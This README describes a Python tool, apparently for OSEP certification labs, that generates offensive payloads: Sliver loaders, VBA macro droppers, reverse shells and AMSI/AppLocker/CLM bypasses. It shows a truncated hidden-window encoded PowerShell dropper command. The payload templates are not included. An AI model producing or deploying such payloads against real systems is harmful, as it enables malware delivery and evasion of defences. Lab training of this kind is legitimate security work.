# OSEP Payload Generation
Glorified YAML parser for payload definitions to generate payloads used throughout OSEP Challenge labs.
This tool was mainly designed to let me compile Sliver loaders and generate known-good macro VBS quickly. It takes in a yaml payload definition and implements Jinja2 templating in order to render variables within the templates, theres also a few helper functions exposed to Jinja to assist with this.
The goal was to automate as much annoying "manual labor" as possible while still printing the commands used etc.

It's pretty jank but hey it works :)

## Usag
```bash
python3 generate.py -h                                
usage: generate.py [-h] [-l LHOST] [-p PAYLOAD] [-L] [-v]

options:
  -h, --help            show this help message and exit
  -l, --lhost LHOST     The interface or IP to have payloads connect back to (Default: tun0)
  -p, --payload PAYLOAD
                        Payload to generate, accepts comma seperated payloads (Default: loader-compile)
  -L, --list            List all the possible payloads
  -v, --verbose         Verbose messages
```

By default we have a few payloads to use, feel free to add some :D

```bash
python3 generate.py -L
[*] Available Payloads:
Name                                               Description
------------------------------------------------------------------------------------------------------------------------------------------------------
apache-config                                      Apache2 Configuration for Sliver staging via HTTP on default kali
jsp-dropper                                        JSP Dropper - Executes powershell to dropand launch
ligolo                                             Convert the ligolo agent into shellcode with required arguments to connect back
loader-compile-apache-hollow                       Compiles the configured .net loader with apache2 staging (x64) via process hollowing
loader-compile-sqlclr                              Compiles the configured .net loader with apache2 staging (x64) for SQL CLR reflection, spawns via process hollowing
macro-clm-reflection                               VBA Macro for dropping a CLM bypass and spawning a reflective beacon (Applocker & Installutil Bypass)
macro-hta-vba-clm-reflection                       VBA Macro for executing mshta, dropping a CLM bypass and spawning a reflective beacon (Applocker & Installutil Bypass) (No Powershell)
macro-hta-vba-powershell-clm-reflection            VBA Macro for executing mshta, dropping a CLM bypass and spawning a reflective beacon (Applocker & Installutil Bypass)
macro-hta-vba-powershell-dropper                   VBA Macro for executing mshta and dropping a beacon (Applocker Bypass)
macro-hta-vba-powershell-reflection                VBA Macro for executing mshta and reflecting a beacon (Applocker Bypass) (AMSI Bypass)
macro-hta-vba-powershell                           VBA Macro & reverse shell for basic Powershell reverse shells via HTA
macro-http-request                                 VBA Macro for a simple HTTP request
macro-powershell-clm-reflection                    VBA Macro for Powershell dropping a CLM bypass and spawning a reflective beacon (Applocker & Installutil Bypass) (AMSI Bypass)
macro-powershell-dropper                           VBA Macro for Powershell dropping beacons
macro-powershell                                   VBA Macro & reverse shell for basic Powershell reverse shells
powershell-dropper                                 Powershell command for dropping beacons
powershell-enum-clm                                Powershell command for enumerating CLM
powershell-reflection                              Powershell command for reflective loading
```

You can generate payloads like
```bash
python3 generate.py -p powershell-dropper
[*][PAYLOAD] powershell-dropper - Powershell command for dropping beacons
---------------------------- Print
Powershell command for dropping a beacon and executing
powershell -ep bypass -Sta -Nop -Window Hidden -e aQB3AHIAIAAtA...
```

I found a lot of the macros to be useless except for `macro-powershell-dropper` and `macro-powershell-clm-reflection` but I guess its better to be prepared?
Most of them will generate alerts halting free loot.

## Installation
On kali, it **should** just work?
but if not venv to the rescue
```bash
python3 -m venv ./venv/
. ./venv/bin/activate
pip install -r requirements.txt
```
For compiling .NET framework on linux, [Mono mcs](https://www.mono-project.com/) is used.
```bash
sudo apt install mono-complete
```
For loading [ligolo-ng](https://github.com/nicocha30/ligolo-ng) TheWover's [Donut](https://github.com/TheWover/donut) is used.

## Payload definition
Theory behind the payloads is you have control over the variables you can put into templates or utilise some of the helper functions to generate dynamic stuff, Say you want a xor key to encrypt a `msfvenom` bin you can specify it to generate random keys. Note that this is procedural so treat it as FIFO as its line by line.
There are 3 main stages to generation, the first being setup commands which execute before anything else (helpful for cleanup of old scripts / executables). The second is printing commands which can be useful for copy and pasting into reports to say what you executed and the third being the generation itself where the final commands are executed.

Initially I made a `test.yml` payload but thought i'd just dump it here checkout `/payloads/` anyways.
```yaml
# Required keys
# commands || print
# commands && print
description: "Testing payload definitions"
# Variable definitions for jinja2 templating in the commands
variables:
  port: 8080
  outputfile: "/tmp/xxxx"
  encodeme: "test"
  nolinebreaks: >-
    there
    shouldnt
    be
    line
    breaks
  withlinebreaks: |-
    linebreaks
    please
    work
# Templates
templates:
  test:
    variables:
      xorkey: "{{ Helpers.random_key() }}"
    template: |-
      multiline
      templating
      {{LHOST}}
      {{xorkey}}
# To Print
print:
- "powershell -ep bypass {{ Encoder.base64(encodeme,Encoder.utf16le) }}"
- "ip address: {{ LHOST }}"
- |-
  cat << EOF > test
  {{Templates.get('test')}}
  EOF
# Commands to be executed prior to rendering templates / actual commands etc
setupCommands:
- "echo nice"
# Commands to execute
commands:
- "echo abcd>test"
```

## Shoutouts
Loader* - [https://github.com/Logan-Elliott/HollowGhost](https://github.com/Logan-Elliott/HollowGhost)
Macro AMSI Bypass via Patch - [https://github.com/hackinaggie/OSEP-Tools-v2/blob/main/Macros/WordMacroRunner.vbs](https://github.com/hackinaggie/OSEP-Tools-v2/blob/main/Macros/WordMacroRunner.vbs)

